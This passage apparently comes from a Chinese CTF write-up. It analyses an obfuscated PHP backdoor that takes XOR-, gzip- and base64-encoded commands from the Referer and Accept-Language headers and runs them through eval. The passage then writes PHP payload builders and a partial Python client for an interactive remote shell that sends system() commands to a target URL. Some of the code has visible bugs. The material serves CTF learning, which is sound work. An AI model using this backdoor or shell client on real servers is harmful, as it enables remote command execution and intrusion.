class="comment">#返回$q中的所有值</span></span><br><span class="line">    <span class="variable">$q</span> = <span class="title function_ invoke__">array_values</span>(<span class="variable">$q</span>);</span><br><span class="line">    <span class="comment">#执行全局的正则匹配表达式,将结果输出到$m数组中,这个可以单独拿出来看</span></span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&quot;</span>, <span class="variable">$ra</span>, <span class="variable">$m</span>);</span><br><span class="line">    <span class="comment">/*/([\w])[\w-]+(?:;q=0.([\d]))?,?/</span></span><br><span class="line"><span class="comment">    \w匹配字母数字下划线</span></span><br><span class="line"><span class="comment">    [\w]匹配数字字母下划线中的任何字符</span></span><br><span class="line"><span class="comment">    ([\w]把匹配到的数字字母下划线放到一个分组中</span></span><br><span class="line"><span class="comment">    [\w-]匹配数字字母下划线与-中的任何字符</span></span><br><span class="line"><span class="comment">    +表示匹配一个或更多个前面的标记连起来就是匹配不止一个数字字母下划线和-</span></span><br><span class="line"><span class="comment">    (?:)表示非捕获分组用于单纯的把数个标记组在一起用于后面的?组合匹配</span></span><br><span class="line"><span class="comment">    ;q=0表示匹配;q=0这些字符</span></span><br><span class="line"><span class="comment">    .表示匹配任何字符不包括换行符</span></span><br><span class="line"><span class="comment">    ([\d])\d表示匹配任何数字0-9</span></span><br><span class="line"><span class="comment">    ?表示匹配0个或一个前面的标记</span></span><br><span class="line"><span class="comment">    (?:;q=0.([\d]))?综合起来就是匹配;q=0任意字符 数字一次但不捕获</span></span><br><span class="line"><span class="comment">    ,?表示匹配0次逗号或者一次逗号</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$q</span> &amp;&amp; <span class="variable">$m</span>) &#123;</span><br><span class="line">        <span class="comment">#屏蔽错误并且开启一个新的session</span></span><br><span class="line">        @<span class="title function_ invoke__">session_start</span>();</span><br><span class="line">        <span class="comment">#$s也同时可以使用$_SESSION的值 ,两个变量指向一个内容</span></span><br><span class="line">        <span class="variable">$s</span> =&amp; <span class="variable">$_SESSION</span>;</span><br><span class="line">        <span class="variable">$ss</span> = <span class="string">&quot;substr&quot;</span>;</span><br><span class="line">        <span class="variable">$sl</span> = <span class="string">&quot;strtolower&quot;</span>;</span><br><span class="line">        <span class="comment">#拼接前两中语言的首字母</span></span><br><span class="line">        <span class="variable">$i</span> = <span class="variable">$m</span>[<span class="number">1</span>][<span class="number">0</span>] . <span class="variable">$m</span>[<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">        <span class="comment">#在连接预定义字符串截取0-3位,在进行小写转换</span></span><br><span class="line">        <span class="variable">$h</span> = <span class="variable">$sl</span>(<span class="variable">$ss</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$i</span> . <span class="variable">$kh</span>), <span class="number">0</span>, <span class="number">3</span>));</span><br><span class="line">        <span class="variable">$f</span> = <span class="variable">$sl</span>(<span class="variable">$ss</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$i</span> . <span class="variable">$kf</span>), <span class="number">0</span>, <span class="number">3</span>));</span><br></pre></td></tr></table></figure>

<p> 需要注意这个正则函数 <code>preg_match_all()</code> , 该函数从 <code>Accept-Language</code> 取值 , 然后通过正则匹配后输出到 $m 数组中 . 单独拿出来看 , $m 数组的输出内容是如下这样的 .  </p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203092208898.png" alt="1646490699195"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$m[0] : 所有可选语言及其权重系数</span><br><span class="line">$m[1] : 所有可选语言的首字母</span><br><span class="line">$m[2] : 所有可选语言的权重值( 不清楚该怎么说 , 反正你能明白 )</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">举个例子 : Accept-Language: zh-cn,zh;q=0.5</span><br><span class="line"></span><br><span class="line">1. Accept-Language表示浏览器所支持的语言类型 . </span><br><span class="line">2. zh-CN 表示简体中文 , zh 表示中文 , 不同语言之间用逗号分割 .</span><br><span class="line">3. q 是权重系数 , 范围为 [0,1] . q 值越大 , 请求越倾向于获得其对应语言表示的内容 . 若没有指定 q 值，则默认为1 . 若被赋值为0 , 则用于提醒服务器该语言是浏览器不接受的内容类型 .</span><br></pre></td></tr></table></figure>

<p> 然后拼接了前两种可选语言的首字母 , 和预定义的字符串拼接并进行 md5 校验 , 截取等操作 . 然后赋值给 <code>$h</code> 和 <code>$f</code> 两个变量 </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#$p 应该是指payload,现在还为空</span></span><br><span class="line">        <span class="variable">$p</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$z</span> = <span class="number">1</span>; <span class="variable">$z</span> &lt; <span class="title function_ invoke__">count</span>(<span class="variable">$m</span>[<span class="number">1</span>]); <span class="variable">$z</span>++)</span><br><span class="line">            <span class="comment"># $m[2]是语言权重的整数值</span></span><br><span class="line">            <span class="variable">$p</span> .= <span class="variable">$q</span>[<span class="variable">$m</span>[<span class="number">2</span>][<span class="variable">$z</span>]];</span><br><span class="line">        <span class="comment">#如果$p 中$h首次出现的位置在开头</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$p</span>, <span class="variable">$h</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="variable">$s</span>[<span class="variable">$i</span>] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="comment">#返回 $p 中的第四个字符到末尾的字符串(即去除$p前三个字符)</span></span><br><span class="line">            <span class="variable">$p</span> = <span class="variable">$ss</span>(<span class="variable">$p</span>, <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">#查找数组$s中是否有指定键名$i,即查找$-SESSION中是否存在键名$i</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$i</span>, <span class="variable">$s</span>)) &#123;</span><br><span class="line">            <span class="comment"># $_SESSION[$i] = $_SESSION[$i] . $p</span></span><br><span class="line">            <span class="variable">$s</span>[<span class="variable">$i</span>] .= <span class="variable">$p</span>;</span><br><span class="line">            <span class="comment">#$e 为$_SESSION[$i] 中$f第一次出现的位置</span></span><br><span class="line">            <span class="variable">$e</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$s</span>[<span class="variable">$i</span>], <span class="variable">$f</span>);</span><br></pre></td></tr></table></figure>

<p>循环中的 <code>$p .= $q[$m[2][$z]]</code> 会不断从 <code>$q</code> 中提取数据 . 结合之前的代码 , 攻击代码是放在 <code>Referer</code> 中的( 最后会放在 <code>$q</code> 中 ) , 因此这里可以看作是拼接攻击代码 , 组合成 Payload . ‘</p>
<p>然后判断 $h 是否出现在 Payload 的开头 , 若是则设置 <code>$_SESSION[&#39;$i&#39;] = &quot;&quot;</code>  , 同时删除 Payload 的 $h 部分 . </p>
<p>接着判断 <code>$_SESSION</code> 中那个是否存在 <code>$i</code> 这个键名 , 若是则将 Payload 赋值给 <code>$_SESSION[$i]</code> , 然后查找 <code>$_SESSION[$i]</code>( 也就是 Payload ) 中 <code>$f</code> 第一次出现的位置 .</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">if</span> (<span class="variable">$e</span>) &#123;</span><br><span class="line">                <span class="comment">#$k = 42f7e9ac</span></span><br><span class="line">                <span class="variable">$k</span> = <span class="variable">$kh</span> . <span class="variable">$kf</span>;</span><br><span class="line">                <span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">                <span class="comment">/*这段比较复杂</span></span><br><span class="line"><span class="comment">                $ss($s[i],0,$e) 先删除了$_SESSION[$i] 中的 $f.</span></span><br><span class="line"><span class="comment">                 preg_replace():将剩余部分中的&#x27;_&#x27;和&#x27;-&#x27;替换为&#x27;/&#x27;和&#x27;+&#x27;</span></span><br><span class="line"><span class="comment">                base64_decode():然后对替换后的内容进行base64解码</span></span><br><span class="line"><span class="comment">                x():接着对其进行那个异或加密,该函数在开头定义了</span></span><br><span class="line"><span class="comment">                gzuncompress():解压一个压缩字符串</span></span><br><span class="line"><span class="comment">                最后通过eval执行</span></span><br><span class="line"><span class="comment">                 * */</span></span><br><span class="line">                @<span class="keyword">eval</span>(@<span class="title function_ invoke__">gzuncompress</span>(@<span class="title function_ invoke__">x</span>(@<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">preg_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;/_/&quot;</span>, <span class="string">&quot;/-/&quot;</span>), <span class="keyword">array</span>(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;+&quot;</span>), <span class="variable">$ss</span>(<span class="variable">$s</span>[<span class="variable">$i</span>], <span class="number">0</span>, <span class="variable">$e</span>))), <span class="variable">$k</span>)));</span><br><span class="line">                <span class="comment"># 返回输出缓冲区内容到$o</span></span><br><span class="line">                <span class="variable">$o</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">                <span class="comment">#清空缓冲区并关闭输出缓冲</span></span><br><span class="line">                <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">                <span class="comment">#对缓冲区输入内容通过gzcompress()函数压缩,通过x()异或加密,通过base64编码</span></span><br><span class="line">                <span class="variable">$d</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">x</span>(<span class="title function_ invoke__">gzcompress</span>(<span class="variable">$o</span>), <span class="variable">$k</span>));</span><br><span class="line">                <span class="keyword">print</span>(<span class="string">&quot;&lt;<span class="subst">$k</span>&gt;<span class="subst">$d</span>&lt;/<span class="subst">$k</span>&gt;&quot;</span>);</span><br><span class="line">                <span class="comment">#销毁一个会话中的所有数据</span></span><br><span class="line">                @<span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$g</span>=<span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$f</span>);</span><br><span class="line"><span class="variable">$g</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>紧跟上面的上面的代码,若payload中找到了$f第一次出现的位置,(也就是说明$f在payload中),就会继续执行如下过程.</p>
<ol>
<li>生成密钥$k,该值由预定义的两个字符串拼接而成,然后打开输出控制缓冲区</li>
<li>截取payload中从开头到$f出现位置的这部分字符串(由此可以判断$f应该是出现在payload的末尾,这里删去$f)</li>
<li>利用pre_replace()函数,正则替换字符串中的’_’和’-‘为’&#x2F;‘和’+’</li>
<li>替换后的字符串进行base64_decode解码操作</li>
<li>对解码后的字符串进行循环异或运算(就是调用x()函数)</li>
<li>对计算后的字符串调用gzuncompress()函数进行压缩</li>
<li>通过eval()函数执行压缩后的字符串</li>
<li>返回输出到缓冲区的内容,然后清空并关闭输出缓冲区</li>
<li>对缓冲区输出的内容通过gzcompress()函数进行压缩,再通过x()函数进行循环异或运算,最后通过base64_encode编码输出</li>
</ol>
<p>整个后门代码的思路就是应该如上,攻击者通过referer传输攻击代码,这段攻击代码的格式应该为填充字符串+加密混淆后的payload+填充字符串.</p>
<p>该后门脚本接受到攻击者传送的数据包,先按照一定的顺序取出攻击代码,然后把前面两侧的填充字符串去除,拿到payload,然后对payload进行解密反混淆操作,接着通过eval函数执行攻击者指定的命令,最后通过命令执行结果加密编码呈现给攻击者</p>
<p>整体的解密流程还是非常清晰的,我们知道了后门是如何处理攻击者发送的恶意数据包,但是我们现在还没有连接脚本.无法构造出后门能处理的请求.因此这里需要逆向整个解密流程,以便构造出请求的数据包</p>
<h2 id="逆向分析后门解密过程"><a href="#逆向分析后门解密过程" class="headerlink" title="逆向分析后门解密过程"></a>逆向分析后门解密过程</h2><p>我们需要根据解密流程构造出加密过程,其主要过程如下所示</p>
<ol>
<li><p>定义一些变量与函数</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="variable">$kh</span> = <span class="string">&quot;42f7&quot;</span>;</span><br><span class="line"> <span class="variable">$kf</span> = <span class="string">&quot;e9ac&quot;</span>;</span><br><span class="line"> <span class="variable">$k</span> = <span class="string">&quot;42f7e9ac&quot;</span>;<span class="comment">#$k = $kh.$kf</span></span><br><span class="line"><span class="variable">$language</span> = <span class="string">&quot;en,zh-CN;q=0.9,zh;q=8,zh-TW;q=0.7&quot;</span>;<span class="comment">#假设的 Accept-Language</span></span><br><span class="line"><span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&quot;</span>,<span class="variable">$language</span>,<span class="variable">$m</span>);<span class="comment">#输出$m 数组</span></span><br><span class="line"><span class="variable">$i</span> = <span class="string">&quot;ez&quot;</span>;<span class="comment">#$i = $m[1][0].$m[1][1];$m[1][0] = &quot;e&quot; , $m[1][1] = &quot;z&quot;</span></span><br><span class="line"><span class="variable">$h</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$i</span>.<span class="variable">$kh</span>),<span class="number">0</span>,<span class="number">3</span>));</span><br><span class="line"><span class="variable">$f</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$i</span>.<span class="variable">$kf</span>),<span class="number">0</span>,<span class="number">3</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">#定义x()函数</span></span><br><span class="line"><span class="comment">#由于异或运算是循环的(A ^ B ^ B = A),因此加密解密函数不变</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$k</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$k</span>);</span><br><span class="line">    <span class="variable">$l</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$o</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="variable">$l</span>;)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>;(<span class="variable">$j</span> &lt; <span class="variable">$c</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="variable">$l</span>);<span class="variable">$j</span>++,<span class="variable">$i</span>++)&#123;</span><br><span class="line">            <span class="variable">$o</span> .= <span class="variable">$t</span>[<span class="variable">$i</span>] ^ <span class="variable">$k</span>[<span class="variable">$j</span>]; <span class="comment">#php在7.4不在使用花括号访问数组或者字符串的偏移量需要将&#123;&#125;换成[]解决,这里先放着</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$o</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">x</span>(<span class="variable">$h</span>,<span class="variable">$f</span>);</span><br></pre></td></tr></table></figure>

<p> 这里主要提一下函数x(),正如注释里写的由于 A ^ B ^ B &#x3D; A这个特性,所以加密过程和机密过程的x() 是完全相同的</p>
</li>
<li><p>构造payload</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#构造payload</span></span><br><span class="line"><span class="variable">$payload1</span> = <span class="string">&quot;phpinfo()&quot;</span>;<span class="comment">#假设payload1为phpinfo();</span></span><br><span class="line"><span class="variable">$payload2</span> = @<span class="title function_ invoke__">gzcompress</span>(<span class="variable">$payload1</span>);<span class="comment">#gzuncompress 逆向操作</span></span><br><span class="line"><span class="variable">$payload3</span> = @<span class="title function_ invoke__">x</span>(<span class="variable">$payload2</span>,<span class="variable">$k</span>);<span class="comment">#因为是异或运算,就无所谓逆向不逆向</span></span><br><span class="line"><span class="variable">$payload4</span> = @<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$payload3</span>);<span class="comment">#base64-decode逆向操作</span></span><br><span class="line"><span class="variable">$payload5</span> = <span class="title function_ invoke__">preg_match</span>(<span class="keyword">array</span>(<span class="string">&quot;/\//&quot;</span>,<span class="string">&quot;/\+/&quot;</span>),<span class="keyword">array</span>(<span class="string">&quot;_&quot;</span>,<span class="string">&quot;-&quot;</span>),<span class="variable">$payload4</span>); <span class="comment">#逆向正则替换</span></span><br><span class="line"><span class="variable">$payload6</span> = <span class="variable">$payload5</span>.<span class="variable">$f</span>;<span class="comment"># 在末尾补齐$f</span></span><br><span class="line"><span class="variable">$payload7</span> = <span class="variable">$h</span> . <span class="variable">$payload6</span>;<span class="comment">#在开头补全$h</span></span><br><span class="line"><span class="variable">$payload</span> = <span class="variable">$payload7</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#根据源代码 $p .=$q[$m[2][$z]];可以看出 $payload 拼接自 $q, $p来自与 HTTP_REFERER</span></span><br><span class="line"><span class="comment">#因此这里要构造 referer</span></span><br><span class="line"><span class="variable">$referer</span> = <span class="string">&quot;http://example.cpm/?a=qwer&amp;b=<span class="subst">$payload</span>&quot;</span>;</span><br><span class="line"><span class="comment">#解密时会按照一定的顺序从referer 中取出payload,但是加密过程不需要这一步</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$referer</span>,PHP_EOL;</span><br></pre></td></tr></table></figure>

<p> 结合加密过程的内容,构造的payload过程</p>
</li>
<li><p>对收到的数据包的处理</p>
<p> 因为后门会在eval()处理完毕后返回输出信息,且输出信息是被加密过的,因此还需要一个解密过程</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$output</span> = <span class="string">&quot;xxx&quot;</span>;<span class="comment">#假设这是收到的响应数据</span></span><br><span class="line"><span class="variable">$o1</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$output</span>);</span><br><span class="line"><span class="variable">$o2</span> = <span class="title function_ invoke__">x</span>(<span class="variable">$o1</span>,<span class="variable">$k</span>);</span><br><span class="line"><span class="variable">$o3</span> = <span class="title function_ invoke__">gzuncompress</span>(<span class="variable">$output</span>);</span><br></pre></td></tr></table></figure>

<p> 以上就是整个加密构造payload并接收响应数据的流程,思路还是比较简单的</p>
<p> 现在就需要构造出最终的连接脚本</p>
</li>
</ol>
<h2 id="构造构造连接脚本"><a href="#构造构造连接脚本" class="headerlink" title="构造构造连接脚本"></a>构造构造连接脚本</h2><ol>
<li><p>因为从referer中提取的payload的殊勋依赖于Accept-Language,而不同的客户端发送的Accept-Language可能不一样,因此这里需要一个函数来辅助生成随机的可选语言及权重值</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 用于生成随机的 Accept-Language</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="comment"># from idlelib.debugger_r import debugging</span></span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib3.connectionpool <span class="keyword">import</span> xrange</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choicePart</span>(<span class="params">seq, amount</span>):</span><br><span class="line">    <span class="comment"># 获取seq的长度</span></span><br><span class="line">    length = <span class="built_in">len</span>(seq)</span><br><span class="line">    <span class="comment"># 如果长度等于零或者长度小于amount的值就打印错误返回空值</span></span><br><span class="line">    <span class="keyword">if</span> length == <span class="number">0</span> <span class="keyword">or</span> length &lt; amount:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Error Input&#x27;</span>)</span><br><span class="line">        <span class="comment"># 返回空值</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    result = []  <span class="comment"># 定义结果数组</span></span><br><span class="line">    indexes = []  <span class="comment"># 定义索引数组</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="comment"># 当count &lt; amount时就</span></span><br><span class="line">    <span class="keyword">while</span> count &lt; amount:</span><br><span class="line">        i = random.randint(<span class="number">0</span>, length - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> i <span class="keyword">in</span> indexes:  <span class="comment"># 如果i不在indexes数组里面</span></span><br><span class="line">            indexes.append(i)  <span class="comment"># 就追加上i</span></span><br><span class="line">            result.append(seq[i])  <span class="comment"># result数组就追加seq的第i位字符</span></span><br><span class="line">            count += <span class="number">1</span>  <span class="comment"># count+一</span></span><br><span class="line">            <span class="keyword">if</span> count == amount:  <span class="comment"># 如果和amount参数值相等</span></span><br><span class="line">                <span class="keyword">return</span> result  <span class="comment"># 就返回值</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成随机填充字符串(由所有ASCII字符组成,可以不包括不可读的字符)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rand_bytes_flow</span>(<span class="params">amount</span>):</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(amount):  <span class="comment"># 这里产生0 - amount 的数字</span></span><br><span class="line">        result += <span class="built_in">chr</span>(random.randint(<span class="number">0</span>, <span class="number">255</span>))  <span class="comment"># 返回一个随机字符串</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p> 先判断输入的序列串是否为空,不为空就建立result数组,并循环经序列串中的值添加到result数组中,这里的序列串的是可以是可选语言,也可以是权重值,最后返回result数组</p>
</li>
<li><p>因为实际攻击代码的组成为随机填充数据+payload+随机填充数据,并且构造交互式shell也需要随机填充数据,因此这里需要创建函数来生成随机数来填充数据</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 生成随机填充字符串(由所有ASCII字符组成,可以不包括不可读的字符)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rand_bytes_flow</span>(<span class="params">amount</span>):</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(amount):  <span class="comment"># 这里产生0 - amount 的数字</span></span><br><span class="line">        result += <span class="built_in">chr</span>(random.randint(<span class="number">0</span>, <span class="number">255</span>))  <span class="comment"># 返回一个随机字符串</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成随机填充字符串(有所有大小写字符组成)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rand_alpha</span>(<span class="params">amount</span>):</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(amount):</span><br><span class="line">        <span class="comment"># choice() 方法返回一个列表,元素或字符串的随机项</span></span><br><span class="line">        <span class="comment"># string.ascii_letters 会生成所有字母</span></span><br><span class="line">        result += random.choice(string.ascii_letters)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p> 这里创建了两个函数,分别对应不同的情况</p>
</li>
<li><p>循环异或函数</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#模拟x()函数,循环异或加密</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">loop_xor</span>(<span class="params">text,key</span>):</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    len_key = <span class="built_in">len</span>(key)</span><br><span class="line">    len_text = <span class="built_in">len</span>(text)</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; len_text:</span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i &lt; len_text <span class="keyword">and</span> j &lt; len_key:</span><br><span class="line">            result += <span class="built_in">chr</span>(<span class="built_in">ord</span>(key[j]) ^ <span class="built_in">ord</span>(text[i]))</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span>  result</span><br></pre></td></tr></table></figure>

<p> 代码中x()函数</p>
</li>
<li><p>开启debug</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#开启debug选项</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug_Print</span>(<span class="params">msg</span>):</span><br><span class="line">    <span class="keyword">if</span> debugging:</span><br><span class="line">        <span class="built_in">print</span>(msg)</span><br></pre></td></tr></table></figure>

<p>  这个可开可不开 , 开启 Debug 有助于代码分析 </p>
</li>
<li><p>定义基本变量</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义基本变量</span></span><br><span class="line">debugging = <span class="literal">False</span>  <span class="comment"># 默认关闭debug,可用true开启</span></span><br><span class="line">keyh = <span class="string">&quot;42f7&quot;</span>  <span class="comment"># $kh,需要更改</span></span><br><span class="line">keyf = <span class="string">&quot;e9ac&quot;</span>  <span class="comment"># $kf,需要更改</span></span><br><span class="line">xor_key = keyh + keyf  <span class="comment"># $k异或密钥</span></span><br><span class="line">url = <span class="string">&#x27;http://111.200.241.244:61732/hack.php&#x27;</span>  <span class="comment"># 指定url,需要更改</span></span><br><span class="line">defaultlang = <span class="string">&#x27;zh-CH&#x27;</span>  <span class="comment"># 默认Language</span></span><br><span class="line">languages = [<span class="string">&#x27;zh-TW;q=0.%d&#x27;</span>, <span class="string">&#x27;zh-HK;q=0.%d&#x27;</span>, <span class="string">&#x27;en-US;q=0.%d&#x27;</span>, <span class="string">&#x27;en;q=0.%d&#x27;</span>]  <span class="comment"># Accept-Language 模板</span></span><br><span class="line">proxies = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>&#125;  <span class="comment"># 代理,可用burpsuite截取</span></span><br><span class="line">sess = requests.Session()  <span class="comment"># 创建一个session对象</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>生成完整的Accept-Language和payload两侧填充的随机填充空白</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 每次会话产生一次随机的 Accept-Language</span></span><br><span class="line">lang_tmp = choicePart(languages, <span class="number">3</span>)  <span class="comment"># 这里先输出了一个列表,里面包含模板中的三种Aceept-language</span></span><br><span class="line">indexes = <span class="built_in">sorted</span>(choicePart(<span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>), <span class="number">3</span>), reverse=<span class="literal">True</span>)  <span class="comment"># 首先返回了一个三个数字的数组并且按照降序进行排序 例如[8,7,2]</span></span><br><span class="line">accept_lang = [defaultlang]  <span class="comment"># 先添加默认langguage</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    accept_lang.append(lang_tmp[i] % (indexes[i]))</span><br><span class="line">accept_lang_str = <span class="string">&#x27;,&#x27;</span>.join(accept_lang)  <span class="comment"># 使用,连接数组中的元素使其反回一个字符串</span></span><br><span class="line"><span class="comment"># accep_lang_str就是要使用的Accept-language</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#print(accept_lang_str)</span></span><br><span class="line">init2Char = accept_lang[<span class="number">0</span>][<span class="number">0</span>] + accept_lang[<span class="number">1</span>][<span class="number">0</span>]  <span class="comment"># $i 这里的就是数组中的 字符串 所以是二维数组</span></span><br><span class="line">md5 = md5()</span><br><span class="line">md5.update((init2Char + keyh).encode())</span><br><span class="line">md5head = (md5.hexdigest())[<span class="number">0</span>:<span class="number">3</span>]  <span class="comment"># 这块首先进行连接在返回md5值,再返回16进制的数据字符串值 在进行截取前三位</span></span><br><span class="line">md5.update((init2Char + keyf).encode())</span><br><span class="line">md5tail = (md5.hexdigest())[<span class="number">0</span>:<span class="number">3</span>] + rand_alpha(random.randint(<span class="number">3</span>, <span class="number">8</span>))  <span class="comment"># $f + 填充字符串 在进行连接随机数量的填充字符</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li><p>构造payload<strong>这里有点问题在python3 中没有找到合适的函数进行解密</strong></p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 构造payload</span></span><br><span class="line"><span class="comment"># 交互式shell</span></span><br><span class="line">cmd = <span class="string">&quot;system(&#x27;&quot;</span> + <span class="built_in">input</span>(<span class="string">&#x27;shell &gt; &#x27;</span>) + <span class="string">&quot;&#x27;);&quot;</span>  <span class="comment"># 其中input函数是从命令行获取标准输入并返回字符串</span></span><br><span class="line"><span class="keyword">while</span> cmd != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">    <span class="comment"># 在写入payload前填充一些无关数据</span></span><br><span class="line">    query = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">max</span>(indexes) + <span class="number">1</span> + random.randint(<span class="number">0</span>, <span class="number">2</span>)):</span><br><span class="line">        key = rand_alpha(random.randint(<span class="number">3</span>, <span class="number">6</span>))</span><br><span class="line">        value = base64.urlsafe_b64encode(</span><br><span class="line">            (rand_bytes_flow(random.randint(<span class="number">3</span>, <span class="number">12</span>))).encode()).decode()  <span class="comment"># 